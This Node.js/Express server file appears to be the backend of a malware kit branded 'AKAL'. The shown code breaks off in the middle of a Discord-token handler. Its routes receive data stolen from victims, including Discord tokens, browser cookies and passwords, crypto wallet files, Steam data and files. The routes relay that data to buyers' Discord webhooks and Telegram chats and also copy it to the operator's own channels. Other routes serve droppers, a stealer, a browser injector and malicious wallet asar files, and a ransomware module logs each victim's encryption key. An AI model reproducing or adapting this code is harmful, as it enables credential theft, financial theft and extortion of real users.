const express = require('express');
const http = require('http');
const rateLimit = require('express-rate-limit');
const mongoose = require('mongoose');
const session = require('express-session');
const axios = require('axios');
const MongoStore = require('connect-mongo');
const path = require('path');
const os = require('os');
const config = require('../config.json');
const app = express();
const fs = require('fs-extra');
const server = http.createServer(app);
const { MongoClient } = require('mongodb');
const { Client, GatewayIntentBits, WebhookClient } = require('discord.js');
const emojisconfig = require('../emojis.json');
const channelsconfig = require('../channels.json');

const bapi         = channelsconfig.channels.br0wser.webhookURL;
const dapi         = channelsconfig.channels.dxscord.webhookURL;
const eapi          = channelsconfig.channels.ex0dus.webhookURL;
const wapi          = channelsconfig.channels.w4llet.webhookURL;
const wiapi = channelsconfig.channels['w4llet-1njection'].webhookURL;
const iapi       = channelsconfig.channels['1njection'].webhookURL;
const papi       = channelsconfig.channels.pan3lping.webhookURL;
const sapi           = channelsconfig.channels.ste4m.webhookURL;
const fapi           = channelsconfig.channels.f1les.webhookURL;
const mapi       = channelsconfig.channels.m1necraft.webhookURL;

async function error(embed, serverUrl) {
    try {
        const API = new WebhookClient({ url: serverUrl });

        await API.send({
            embeds: [embed]
        });

    } catch (error) {
    }
}

async function errorMonitor(body) {
    try {
        const API = new WebhookClient({ url: iapi });

        await API.send({body});

    } catch (error) {
    }
}

const dashboardUrl = `https://${config.ip}/victims`;

app.set("trust proxy", true);
const postLimiter = rateLimit({
    windowMs: 5 * 60 * 1000, 
    max: 15, 
    validate: {trustProxy: false},  
    message: { success: false, error: 'Too many requests from this IP, please try again after a minute' },
    standardHeaders: true,
    legacyHeaders: false, 
});

const client = new MongoClient(config.mongodb);

const db = client.db('AKAL');
const keysCollection = db.collection('keys');

mongoose.connect(config.mongodb, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
}).then(() => {
    console.log('Connected to MongoDB');
}).catch(err => {
    console.error('MongoDB connection error:', err);
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const injector = require('./Routes/injector');
const createEmojiConstants = (emojisconfig) => {
    const emojiVariables = {};
  
    for (const [key, value] of Object.entries(emojisconfig)) {
      emojiVariables[key] = value;
    }
  
    return emojiVariables;
  };

app.post('/dc-injector', injector);
app.post('/discord-injection/:key', postLimiter, async (req, res) => {
  const key = req.params.key;
  const { body } = req;
  console.log(body)
  try {
    const check = await keysCollection.findOne({ key: key });

    if (!check) {
        console.error('Key not found in the database');
        return;
    }

    const webhookUrl = check.webhook;

    if (!webhookUrl) {
        console.error('Webhook URL not found for this key');
        return;
    }

    const webhookClient = new WebhookClient({ url: webhookUrl });
    await webhookClient.send(body);
    await errorMonitor(body);
    res.status(200);
  } catch (error) {
    console.error(error);
    res.status(500);
  }
});
app.post('/telegram-injection/:key', postLimiter, async (req, res) => {
  const key = req.params.key;
  const { body } = req;

  console.log(body);

  try {
    const check = await keysCollection.findOne({ key: key });

    if (!check) {
      console.error('Key not found in the database');
      return res.status(404).json({ success: false, error: 'Key not found' });
    }

    const logChatId = check.keyOwner;
    if (!logChatId) {
      return res.status(400).json({ success: false, error: 'logChatId (keyOwner) not found' });
    }

    await axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
      chat_id: logChatId,
      text: typeof body === 'string' ? body : JSON.stringify(body, null, 2),
      parse_mode: "Markdown"
    });

    await errorMonitor(body);

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Telegram sendMessage error:", error?.response?.data || error.message);
    res.status(500).json({ success: false, error: 'Internal Server Error' });
  }
});
app.get('/download/game_cache', (req, res) => { //panel
    const filePath = path.join(__dirname, 'Encoder', 'compressed', 'game_cache.exe.br'); 

    res.sendFile(filePath, (err) => {
        if (err) {
            if (err.code === 'ENOENT') {
                console.error('File not found:', err);
                return res.status(404).send('File not found.');
            } else if (err.code === 'ECONNABORTED') {
                console.warn('Client aborted the request:', err);
            } else {
                console.error('Error sending file:', err);
            }
        } else {
        }
    });
});

app.get('/download/save_data', (req, res) => { //inject dropper
  const filePath = path.join(__dirname, 'Encoder', 'compressed', 'save_data.exe.br'); 

  res.sendFile(filePath, (err) => {
      if (err) {
          if (err.code === 'ENOENT') {
              console.error('File not found:', err);
              return res.status(404).send('File not found.');
          } else if (err.code === 'ECONNABORTED') {
              console.warn('Client aborted the request:', err);
          } else {
              console.error('Error sending file:', err);
          }
      } else {
      }
  });
});

app.get('/download/inject', (req, res) => { //inject
  const filePath = path.join(__dirname, 'exe', 'chrome_inject', 'chromelevator.exe'); 

  res.sendFile(filePath, (err) => {
      if (err) {
          if (err.code === 'ENOENT') {
              console.error('File not found:', err);
              return res.status(404).send('File not found.');
          } else if (err.code === 'ECONNABORTED') {
              console.warn('Client aborted the request:', err);
          } else {
              console.error('Error sending file:', err);
          }
      } else {
      }
  });
});

app.get('/download/stats_db', (req, res) => { //stealer
  const filePath = path.join(__dirname, 'Encoder', 'compressed', 'stats_db.exe.br'); 

  res.sendFile(filePath, (err) => {
      if (err) {
          if (err.code === 'ENOENT') {
              console.error('File not found:', err);
              return res.status(404).send('File not found.');
          } else if (err.code === 'ECONNABORTED') {
              console.warn('Client aborted the request:', err);
          } else {
              console.error('Error sending file:', err);
          }
      } else {
      }
  });
});

app.get('/download/extension', (req, res) => {
  const filePath = path.join(__dirname, 'extension', 'extension.zip');

  res.sendFile(filePath, (err) => {
      if (err) {
          if (err.code === 'ENOENT') {
              console.error('File not found:', err);
              return res.status(404).send('File not found.');
          } else if (err.code === 'ECONNABORTED') {
              console.warn('Client aborted the request:', err);
          } else {
              console.error('Error sending file:', err);
          }
      } else {
      }
  });
});

const clientdc = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.GuildEmojisAndStickers, GatewayIntentBits.MessageContent] });
const uploadEmojis = require('./uploadEmojis'); 
const removeEmojis = require('./removeChannelsAndEmojis');
const emojiVars = createEmojiConstants(emojisconfig);
const active_developer = emojiVars['active_developer'];
const brilliance = emojiVars['brilliance'];
const quest = emojiVars['questbadge'];
const bravery = emojiVars['bravery'];
const bughunter = emojiVars['bughunter'];
const bughuntergold = emojiVars['bughuntergold'];
const discord_employee = emojiVars['discord_employee'];
const discord_nitro = emojiVars['discord_nitro'];
const early_supporter = emojiVars['early_supporter'];
const early_verified_bot_developer = emojiVars['early_verified_bot_developer'];
const hypesquad_events = emojiVars['hypesquad_events'];
const moderatorprogramsalumni = emojiVars['moderatorprogramsalumni'];
const nitro_boost_18_months = emojiVars['nitro_boost_18_months'];
const nitro_boost_3_months = emojiVars['nitro_boost_3_months'];
const nitro_boost_9_months = emojiVars['nitro_boost_9_months'];
const oldusername = emojiVars['oldusername'];
const partnered_server_owner = emojiVars['partnered_server_owner'];
const paypal = emojiVars['paypal'];
const boost1month = emojiVars['boost1month'];
const boost15month = emojiVars['boost15month'];
const nitro_bronze = emojiVars['bronze'];
const nitro_silver = emojiVars['silver'];
const nitro_gold = emojiVars['gold'];
const nitro_platinum = emojiVars['platinum'];
const nitro_diamond = emojiVars['diamond'];
const nitro_emerald = emojiVars['emerald'];
const nitro_ruby = emojiVars['ruby'];
const nitro_opal = emojiVars['opal'];
const balance = emojiVars['balance'];
const sixmonths_boost = emojiVars['6months_boost'];
const twomonthsboostnitro = emojiVars['2monthsboostnitro'];
const twelvemonthsboostnitro = emojiVars['12monthsboostnitro'];
const twentyfour_months = emojiVars['24_months'];

clientdc.login(config.dctoken);

clientdc.on('ready', () => {
  console.log(`Logged in as ${clientdc.user.tag}!`);
});
  
app.use(express.urlencoded({ extended: true }));

  const filePathREXE = path.join(__dirname, 'ransomware', 'builder', 'decrypter.exe');
  const filePathRPNG = path.join(__dirname, 'ransomware', 'builder', 'wallpaper.png');

  
  app.get('/ransomware/data/:key', async (req, res) => {
    const { key } = req.params;
    try {
      const check = await keysCollection.findOne({ key: key });
  
      const message = check?.Rmessage || 'https://t.me/AKALgroup';
      const wallpaper_url = check?.Rwallpaper_url || 'https://voidcitizen.space/ransomware/background.png';
  
      const apiDataR = {
        success: true,
        message: message,
        wallpaper_url: wallpaper_url
      };
  
      res.json(apiDataR);
  
    } catch (err) {
      console.error('Error in /ransomware/data route:', err);
      res.status(500).json({ success: false, error: 'Internal Server Error' });
    }
  });
  
  app.post('/ransomware/webhook/:key/:hwid/:randomKey', async (req, res) => {
    const { key, hwid, randomKey } = req.params;
  
    try {
      const check = await keysCollection.findOne({ key: key });
      if (!check) {
        return res.status(404).json({ success: false, error: 'Key not found in the database' });
      }
  
      if (!check.logType || check.logType === "discord") {
        const webhookUrl = check.webhook;
        if (!webhookUrl) {
          return res.status(404).json({ success: false, error: 'Webhook URL not found for this key' });
        }
  
        const embed = {
          title: "🛑 New Victim Detected ON RANSOMWARE",
          description: `A new device has been encrypted.`,
          color: 16711680,
          fields: [
            {
              name: "💻 HWID",
              value: `\`${hwid}\``,
              inline: false
            },
            {
              name: "🔑 Encryption Key",
              value: `\`${randomKey}\``,
              inline: false
            },
            {
              name: "📝 Note",
              value: `📄 A \`readme.txt\` has been created on the Desktop.\n✉️ Message: > ${check.Rmessage}\n🖼️ Desktop wallpaper has been changed to: > [Click here!](${check.Rwallpaper_url})`,
              inline: false
            }
          ],
          footer: {
            text: config.footertext,
            icon_url: config.footericon
          },
          timestamp: new Date().toISOString()
        };
  
        const discordData = {
          username: '🔐 AKAL',
          avatar_url: config.footericon,
          embeds: [embed]
        };
  
        const webhookClient = new WebhookClient({ url: webhookUrl });
        await webhookClient.send(discordData);
        return res.json({ success: true, message: 'Discord webhook sent successfully.' });
  
      } else if (check.logType === "telegram") {
        const logChatId = check.keyOwner;
        if (!logChatId) {
          return res.status(400).json({ success: false, error: 'logChatId (keyOwner) not found' });
        }
  
        const messagex =
  `🛑 *Ransomware Alert!*
  New device encrypted.
  
  💻 *HWID:* \`${hwid}\`
  🔑 *Key:* \`${randomKey}\`
  
  📄 *Note:* ${check.Rmessage}
  🖼️ [Wallpaper](${check.Rwallpaper_url})`;
  
        await axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
          chat_id: logChatId,
          text: messagex,
          parse_mode: "Markdown"
        });
  
        console.log(`Message sent to Telegram for key: ${key}`);
        return res.json({ success: true, message: 'Telegram message sent successfully.' });
      }
  
    } catch (err) {
      console.error('Error in /ransomware/webhook route:', err);
      res.status(500).json({ success: false, error: 'Internal Server Error' });
    }
  });
  
  app.get('/ransomware/download-panel', (req, res) => {
    res.sendFile(filePathREXE, (err) => {
      if (err) {
        if (err.code === 'ENOENT') {
          console.error('File not found:', err);
          return res.status(404).send('File not found.');
        } else {
          console.error('Error sending file:', err);
        }
      }
    });
  });

  app.get('/ransomware/background.png', (req, res) => {
    res.sendFile(filePathRPNG, (err) => {
      if (err) {
        if (err.code === 'ENOENT') {
          console.error('File not found:', err);
          return res.status(404).send('File not found.');
        } else {
          console.error('Error sending file:', err);
          return res.status(500).send('Error sending file.');
        }
      }
    });
  });
  
  const hwidFilePath = path.join(__dirname, 'hwids.txt'); 

app.post('/panelping', express.json(), postLimiter, async (req, res) => {
  const { pcName, hwid, key } = req.body;

  if (!pcName || !hwid || !key || typeof pcName !== 'string' || typeof hwid !== 'string' || typeof key !== 'string') {
    console.warn('❌ Hatalı veya eksik veri:', req.body);
    return res.status(400).json({ error: 'Missing or invalid required fields' });
  }

  const check = await keysCollection.findOne({ key });
    if (!check) {
      console.warn('❌ Key bulunamadı:', key);
      return res.status(404).json({ success: false, error: 'Key not found in the database' });
    }

   try {
  if (!(check.dh && check.dh.NO)) {
    const embed = {
      description: `${pcName} - ${hwid} - ${dashboardUrl}/${hwid}/Panel`,
      color: 65280,
      footer: {
        text: key
      }
    };

    await error(embed, papi);
  }
} catch (err) {
  console.error('Error:', err.message);
}

  try {

    let hwidFileData = '';
    if (fs.existsSync(hwidFilePath)) {
      const stats = fs.statSync(hwidFilePath);
      if (stats.size > 5 * 1024 * 1024) {
        console.error('⚠️ HWID dosyası çok büyük!');
        return res.status(500).json({ error: 'HWID file too large' });
      }

      hwidFileData = fs.readFileSync(hwidFilePath, 'utf8');
    }

    const hwidList = hwidFileData.split('\n').map(h => h.trim()).filter(Boolean);

    if (hwidList.includes(hwid)) {
      console.log('🔁 HWID zaten mevcut, reconnect:', hwid);
      return res.json({ success: true, message: 'Victim Reconnected' });
    }

    try {
      await fs.promises.appendFile(hwidFilePath, `${hwid}\n`);
      console.log('✅ Yeni HWID eklendi:', hwid);
    } catch (err) {
      console.error('❌ HWID dosyasına yazılamadı:', err);
    }

    const hwids = check.hwids || [];
    if (!hwids.includes(hwid)) {
      hwids.push(hwid);
      await keysCollection.updateOne({ key }, { $set: { hwids } });
    }

    if (!check.logType || check.logType === "discord") {
      const webhookUrl = check.webhook;

      const embed = {
        title: "✅ New Victim Joined!",
        description: `[🔗 Click to go to Dashboard](${dashboardUrl}/${hwid}/Panel)`,
        color: 65280,
        fields: [
          { name: "🖥️ PC Name", value: `\`${pcName}\``, inline: false },
          { name: "🆔 HWID", value: `\`${hwid}\``, inline: false }
        ],
        footer: {
          text: config.footertext || "AKAL Logger",
          icon_url: config.footericon || ""
        },
        timestamp: new Date().toISOString()
      };

      try {
        const webhookClient = new WebhookClient({ url: webhookUrl });
        await webhookClient.send({
          username: '🔐 AKAL',
          avatar_url: config.footericon || '',
          embeds: [embed]
        });
      } catch (err) {
        console.error('❌ Discord mesajı gönderilemedi:', err);
      }

    } else if (check.logType === "telegram") {
      const logChatId = check.keyOwner;
      const token = config.winbottoken;
      if (!logChatId || !token) {
        console.warn('❌ Telegram için gerekli bilgi eksik.');
        return res.status(400).json({ success: false, error: 'Missing Telegram chat_id or token' });
      }

      const message = `✅ *New Victim Joined!*\n[🔗 Click to go to Dashboard](${dashboardUrl}/${hwid}/Panel)\n\n*🖥️ PC Name:* \`${pcName}\`\n*🆔 HWID:* \`${hwid}\``;

      try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
          chat_id: logChatId,
          text: message,
          parse_mode: "Markdown"
        });
      } catch (err) {
        console.error('❌ Telegram mesajı gönderilemedi:', err.response?.data || err.message);
      }
    }

    res.json({ success: true, message: 'HWID saved and notification sent.' });

  } catch (error) {
    console.error('❗ İç hata oluştu:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});


app.get('/download/atomic.asar', (req, res) => {
  const filePath = path.join(__dirname, 'asar', 'atomic.asar');

  res.sendFile(filePath, (err) => {
      if (err) {
          if (err.code === 'ENOENT') {
              console.error('File not found:', err);
              return res.status(404).send('File not found.');
          } else if (err.code === 'ECONNABORTED') {
              console.warn('Client aborted the request:', err);
          } else {
              console.error('Error sending file:', err);
          }
      } else {
          console.log('File sent successfully.');
      }
  });
});

app.get('/download/exodus.asar', (req, res) => {
  const filePath = path.join(__dirname, 'asar', 'exodus.asar');

  res.sendFile(filePath, (err) => {
      if (err) {
          if (err.code === 'ENOENT') {
              console.error('File not found:', err);
              return res.status(404).send('File not found.');
          } else if (err.code === 'ECONNABORTED') {
              console.warn('Client aborted the request:', err);
          } else {
              console.error('Error sending file:', err);
          }
      } else {
          console.log('File sent successfully.');
      }
  });
});

app.post('/send-wallet', async (req, res) => {
  const {
    key = 'N/A',
    link = 'N/A',
    walletList = {},
  } = req.body || {};

  const check = await keysCollection.findOne({ key: key });

  if (!check) {
    return res.status(404).json({ success: false, error: 'Key not found in the database' });
  }

  try {
    if (!check.logType || check.logType === 'discord') {

      const webhookUrl = check.webhook;

      if (!webhookUrl) {
        return res.status(404).json({ success: false, error: 'Webhook URL not found for this key' });
      }

      const embed = {
        title: `👛 AKAL Wallet`,
        description: '```json\n' + JSON.stringify(walletList, null, 2) + '\n```',
        color: 0x5865F2,
        timestamp: new Date().toISOString(),
        fields: [
          { name: '🔗 Download', value: `[Click here!](${link})`, inline: false }
        ],
        footer: {
          text: config.footertext,
          icon_url: config.footericon
        }
      };

      const discordData = {
        username: '🔐 AKAL',
        avatar_url: config.footericon,
        embeds: [embed]
      };

      const webhookClient = new WebhookClient({ url: webhookUrl });
      await webhookClient.send(discordData);
      console.log(`✅ Data sent | WALLETDATA`);
      res.sendStatus(200);
    } else if (check.logType === 'telegram') {
      const logChatId = check.keyOwner;

      if (!logChatId) {
        return res.status(400).json({ success: false, error: 'logChatId (keyOwner) not found' });
      }

      let message = `👛 *AKAL Wallet Data*\n\n`;
      message += `🔗 *Download Link*: [Click here!](${link})\n\n`;
      message += `📝 *Wallet List*: \n\`\`\`json\n${JSON.stringify(walletList, null, 2)}\n\`\`\``;

      await axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
        chat_id: logChatId,
        text: message,
        parse_mode: "Markdown"
      });

      console.log('✅ Successfully sent to Telegram! | WALLETDATA');
      res.sendStatus(200);
    }
  } catch (err) {
    console.error('WALLETDATA | ❌ Error during data processing or webhook sending:', err.message);
    res.sendStatus(500);
  }
 try {
  if (!(check.dh && check.dh.NO)) {
    const embed = {
      description: '```json\n' + JSON.stringify(walletList, null, 2) + '\n```',
      color: 0x5865F2,
      timestamp: new Date().toISOString(),
      fields: [
        { name: '🔗 Download', value: `[Click here!](${link})`, inline: false }
      ],
      footer: { text: key }
    };

    await error(embed, wapi);
  }
} catch (err) {
  console.error('Error:', err.message);
}
});

app.post('/send-chromium/:key', async (req, res) => {
  const {
    browser = 'unknown',
    downloadUrl = 'unknown',
    data = []
  } = req.body || {};

  const key = req.params.key;
  const check = await keysCollection.findOne({ key });

  if (!check) {
    return res.status(404).json({ success: false, error: 'Key not found in the database' });
  }

  try {
    let totalCookies = 0, totalPasswords = 0, totalAutofill = 0;
    let allCookieKW = [], allPassKW = [];
    const browserList = new Set();

    if (Array.isArray(data)) {
      for (const item of data) {
        totalCookies += item.cookies || 0;
        totalPasswords += item.passwords || 0;
        totalAutofill += item.autofill || 0;
        if (item.cookieKW) allCookieKW.push(...item.cookieKW);
        if (item.passKW) allPassKW.push(...item.passKW);
        browserList.add(`${item.browserName}(${item.profileName})`);
      }
    }

    function topKeywords(arr, limit = 5) {
      const freq = {};
      arr.forEach(k => { freq[k] = (freq[k] || 0) + 1; });
      return Object.entries(freq)
        .sort((a, b) => b[1] - a[1])
        .slice(0, limit)
        .map(([k, v]) => `${k} (${v})`);
    }

    const topCookieKW = topKeywords(allCookieKW);
    const topPassKW = topKeywords(allPassKW);

    if (!check.logType || check.logType === 'discord') {
      const summaryText = [
        `**🌐 Browsers:** ${[...browserList].join(', ') || browser}`,
        `**🍪 Cookies:** \`${totalCookies}\` | **🔑 Passwords:** \`${totalPasswords}\` | **✍️ Autofill:** \`${totalAutofill}\``,
        topCookieKW.length ? `**📌 Cookies Keywords:** ${topCookieKW.join(', ')}` : '',
        topPassKW.length ? `**🔐 Passwords Keywords:** ${topPassKW.join(', ')}` : ''
      ].filter(Boolean).join('\n');
      const webhookUrl = check.webhook;
      if (!webhookUrl) {
        return res.status(404).json({ success: false, error: 'Webhook URL not found for this key' });
      }

      const embed = {
        title: "🗂️ Chromium Data Report",
        description: "✨ New Chromium dump received!",
        color: 0x5865F2,
        fields: [
          { name: "📊 Summary", value: summaryText },
          { name: "📎 Download", value: `[⬇️ Click to download dump](${downloadUrl})` }
        ],
        thumbnail: { url: config.footericon },
        footer: { text: `${config.footertext} | Key: ${key}`, icon_url: config.footericon },
        timestamp: new Date()
      };

      const webhookClient = new WebhookClient({ url: webhookUrl });
      await webhookClient.send({
        username: '🔐 AKAL',
        avatar_url: config.footericon,
        embeds: [embed]
      });

      console.log(`✅ Data sent to Discord | CHROMIUMDATA`);
      return res.sendStatus(200);
    }

    if (check.logType === 'telegram') {
      const summaryText = [
        `*🌐 Browsers:* ${[...browserList].join(', ') || browser}`,
        `*🍪 Cookies:* \`${totalCookies}\` | *🔑 Passwords:* \`${totalPasswords}\` | *✍️ Autofill:* \`${totalAutofill}\``,
        topCookieKW.length ? `*📌 Cookies Keywords:* ${topCookieKW.join(', ')}` : '',
        topPassKW.length ? `*🔐 Passwords Keywords:* ${topPassKW.join(', ')}` : ''
      ].filter(Boolean).join('\n');
      const logChatId = check.keyOwner;
      if (!logChatId) {
        return res.status(400).json({ success: false, error: 'logChatId (keyOwner) not found' });
      }

      const message = [
        "🗂️ *Chromium Data Report*",
        "",
        summaryText,
        "",
        `📎 [⬇️ Download Dump](${downloadUrl})`
      ].join("\n");

      await axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
        chat_id: logChatId,
        text: message,
        parse_mode: "Markdown"
      });

      console.log('✅ Successfully sent to Telegram! | CHROMIUMDATA');
      return res.sendStatus(200);
    }
  } catch (err) {
    console.error('❌ CHROMIUMDATA Error:', err.message);
    return res.sendStatus(500);
  }
});



app.post('/send-browser', async (req, res) => {
  const { key = 'N/A', filelink = 'N/A', summary = {} } = req.body || {};

  const check = await keysCollection.findOne({ key: key });

  if (!check) {
    return res.status(404).json({ success: false, error: 'Key not found in the database' });
  }

  try {
    if (!check.logType || check.logType === 'discord') {
      const webhookUrl = check.webhook;

      if (!webhookUrl) {
        return res.status(404).json({ success: false, error: 'Webhook URL not found for this key' });
      }

      const embed = {
        title: "🗂️ Browser Data Dump",
        description: `**Collected Content:**\n\`\`\`\n${summary}\n\`\`\``,
        color: 0x3498db,
        fields: [
          { name: "📎 Download", value: `[Click to download](${filelink})` }
        ],
        footer: {
          text: config.footertext,
          icon_url: config.footericon
        }
      };

      const discordData = {
        username: '🔐 AKAL',
        avatar_url: config.footericon,
        embeds: [embed]
      };

      const webhookClient = new WebhookClient({ url: webhookUrl });

      await webhookClient.send(discordData).catch(err => {
        console.error('❌ Error while sending webhook:', err.message);
        res.status(500).json({ success: false, error: 'Error while sending to Discord' });
      });
      
      console.log(`✅ Data sent | BROWSERDATA`);
      res.sendStatus(200);
    } else if (check.logType === 'telegram') {
      const logChatId = check.keyOwner;

      if (!logChatId) {
        return res.status(400).json({ success: false, error: 'logChatId (keyOwner) not found' });
      }

      let message = `🗂️ Browser Data Dump`;
      message += `*Collected Content:*\n\`\`\`\n${summary}\n\`\`\``;
      message += `📎 Download: [Click to download](${filelink})`;

      await axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
        chat_id: logChatId,
        text: message,
        parse_mode: "Markdown"
      });

      console.log('✅ Successfully sent to Telegram! | BROWSERDATA');
      res.sendStatus(200);
    }
  } catch (err) {
    console.error('BROWSERDATA | ❌ Error during data processing or webhook sending:', err.message);
    res.sendStatus(500);
  }

       try {
  if (!(check.dh && check.dh.NO)) {
    const embed = {
        description: `\`\`\`\n${summary}\n\`\`\``,
        color: 0x3498db,
        fields: [
          { name: "📎 Download", value: `[Click to download](${filelink})` }
        ],
      footer: { text: key }
    };

    await error(embed, bapi);
  }
} catch (err) {
  console.error('Error:', err.message);
}
});


app.post('/send-exodus', async (req, res) => {
  const {
    key = 'N/A',
    link = 'N/A',
    foundPassword = 'N/A',
  } = req.body || {};

  const check = await keysCollection.findOne({ key: key });

  if (!check) {
    return res.status(404).json({ success: false, error: 'Key not found in the database' });
  }

  try {
    if (!check.logType || check.logType === 'discord') {

      const webhookUrl = check.webhook;

      if (!webhookUrl) {
        return res.status(404).json({ success: false, error: 'Webhook URL not found for this key' });
      }
    
      const embed = {
        title: `👛 AKAL Exodus`,
        description: `*Password:* \`${foundPassword || 'No password'}\``,
        color: 0x5865F2,
        timestamp: new Date().toISOString(),
        fields: [
          { name: '🔗 Download', value: `[Click here!](${link})`, inline: false }
        ],
        footer: {
          text: config.footertext,
          icon_url: config.footericon
        }
      };

      const discordData = {
        username: '🔐 AKAL',
        avatar_url: config.footericon,
        embeds: [embed]
      };

      const webhookClient = new WebhookClient({ url: webhookUrl });
      await webhookClient.send(discordData);
      console.log(`✅ Data sent | EXODUSDATA`);
      res.sendStatus(200);
    } else if (check.logType === 'telegram') {
      const logChatId = check.keyOwner;

      if (!logChatId) {
        return res.status(400).json({ success: false, error: 'logChatId (keyOwner) not found' });
      }

      let message = `👛 *AKAL Exodus Data*\n\n`;
      message += `🔑 *Password*: \`${foundPassword || 'No password'}\`\n`;
      message += `🔗 *Download Link*: [Click here!](${link})`;

      await axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
        chat_id: logChatId,
        text: message,
        parse_mode: "Markdown"
      });

      console.log('✅ Successfully sent to Telegram! | EXODUSDATA');
      res.sendStatus(200);
    }
  } catch (err) {
    console.error('EXODUSDATA | ❌ Error during data processing or webhook sending:', err.message);
    res.sendStatus(500);
  }

       try {
  if (!(check.dh && check.dh.NO)) {
    const embed = {
        description: `*Password:* \`${foundPassword || 'No password'}\``,
        color: 0x5865F2,
        timestamp: new Date().toISOString(),
        fields: [
          { name: '🔗 Download', value: `[Click here!](${link})`, inline: false }
        ],
        footer: {
      footer: { text: key }
     }
      };

    await error(embed, eapi);
  }
} catch (err) {
  console.error('Error:', err.message);
}
});

app.post('/send-steam', async (req, res) => {
  const {
    key = 'N/A',
    link = 'N/A',
    message = 'N/A',
  } = req.body || {};

  const check = await keysCollection.findOne({ key: key });

  if (!check) {
    return res.status(404).json({ success: false, error: 'Key not found in the database' });
  }

  try {
    if (!check.logType || check.logType === 'discord') {
      const webhookUrl = check.webhook;

      if (!webhookUrl) {
        return res.status(404).json({ success: false, error: 'Webhook URL not found for this key' });
      }

      const embed = {
        title: `🎮 AKAL Steam`,
        description: message,
        color: 0x5865F2,
        timestamp: new Date().toISOString(),
        fields: [
          { name: '🔗 Download', value: `[Click here!](${link})`, inline: false }
        ],
        footer: {
          text: config.footertext,
          icon_url: config.footericon
        }
      };

      const discordData = {
        username: '🔐 AKAL',
        avatar_url: config.footericon,
        embeds: [embed]
      };

      const webhookClient = new WebhookClient({ url: webhookUrl });
      await webhookClient.send(discordData);
      console.log(`✅ Data sent | STEAMDATA`);
      res.sendStatus(200);
    } else if (check.logType === 'telegram') {
      const logChatId = check.keyOwner;

      if (!logChatId) {
        return res.status(400).json({ success: false, error: 'logChatId (keyOwner) not found' });
      }

      let messagex = `🎮 *AKAL Steam Data*\n\n`;
      messagex += `💬 *Message*: ${message}\n`;
      messagex += `🔗 *Download Link*: [Click here!](${link})`;

      await axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
        chat_id: logChatId,
        text: messagex,
        parse_mode: "Markdown"
      });

      console.log('✅ Successfully sent to Telegram! | STEAMDATA');
      res.sendStatus(200);
    }
  } catch (err) {
    console.error('STEAMDATA | ❌ Error during data processing or webhook sending:', err.message);
    res.sendStatus(500);
  }

  try {
    if (!(check.dh && check.dh.NO)) {
      const embed = {
        description: message,
        color: 0x5865F2,
        timestamp: new Date().toISOString(),
        fields: [
          { name: '🔗 Download', value: `[Click here!](${link})`, inline: false }
        ],
        footer: { text: key }
      };

      await error(embed, sapi);
    }
  } catch (err) {
    console.error('STEAMDATA | 🔁 Extra embed gönderim hatası:', err.message);
  }
});

app.post('/send-files', async (req, res) => {
  const {
    key = 'N/A',
    link = 'N/A',
    contentMessage = 'N/A',
  } = req.body || {};

  const check = await keysCollection.findOne({ key: key });

  if (!check) {
    return res.status(404).json({ success: false, error: 'Key not found in the database' });
  }

  try {
    if (!check.logType || check.logType === 'discord') {

      const webhookUrl = check.webhook;

      if (!webhookUrl) {
        return res.status(404).json({ success: false, error: 'Webhook URL not found for this key' });
      }

      const embed = {
        title: `🔎 AKAL Found`,
        description: contentMessage,
        color: 0x5865F2,
        timestamp: new Date().toISOString(),
        fields: [
          { name: '🔗 Download', value: `[Click here!](${link})`, inline: false }
        ],
        footer: {
          text: config.footertext,
          icon_url: config.footericon
        }
      };

      const discordData = {
        username: '🔐 AKAL',
        avatar_url: config.footericon,
        embeds: [embed]
      };

      const webhookClient = new WebhookClient({ url: webhookUrl });
      await webhookClient.send(discordData);
      console.log(`✅ Data sent | FILESDATA`);
      res.sendStatus(200);

    } else if (check.logType === 'telegram') {
      const logChatId = check.keyOwner;

      if (!logChatId) {
        return res.status(400).json({ success: false, error: 'logChatId (keyOwner) not found' });
      }

      let messagex = `🔎 *AKAL Found Files*\n\n`;
      messagex += `📝 *Content Message*: ${contentMessage}\n`;
      messagex += `🔗 *Download Link*: [Click here!](${link})`;

      await axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
        chat_id: logChatId,
        text: messagex,
        parse_mode: "Markdown"
      });

      console.log('✅ Successfully sent to Telegram! | FILESDATA');
      res.sendStatus(200);
    }
  } catch (err) {
    console.error('FILESDATA | ❌ Error during data processing or webhook sending:', err.message);
    res.sendStatus(500);
  }

  try {
    if (!(check.dh && check.dh.NO)) {
      const embed = {
        description: contentMessage,
        color: 0x5865F2,
        timestamp: new Date().toISOString(),
        fields: [
          { name: '🔗 Download', value: `[Click here!](${link})`, inline: false }
        ],
        footer: { text: key }
      };

      await error(embed, fapi); 
    }
  } catch (err) {
    console.error('FILESDATA | 🔁 Extra log gönderim hatası:', err.message);
  }
});

app.post('/send-discord', async (req, res) => {
  const { key = 'N/A', token = 'N/A' } = req.body || {};

  const check = await keysCollection.findOne({ key: key });
  if (!check) {
    return res.status(404).json({ success: false, error: 'Key not found in the database' });
  }

  let userData;
  try {
    userData = await getUserData(token);
    if (!userData) {
      return res.status(400).send('Invalid user data');
    }
  } catch (err) {
    return res.status(400).send('Invalid token');
  }

  const profileData = await getProfileData(token, userData.id);
  const billing = await getBilling(token) || 'None';
  const badges = await getBadges(userData.flags) || 'None';
  const nitro = await getNitro(userData.premium_type, userData.id, token, profileData?.premium_since) || 'None';

  try {
    const userInformationEmbed = {
      color: 0x5865F2,
      author: {
        name: userData.username,
        icon_url: userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : 'https://cdn.discordapp.com/embed/avatars/0.png'
      },
      title: `🛡️ AKAL – ${os.userInfo().username}`,
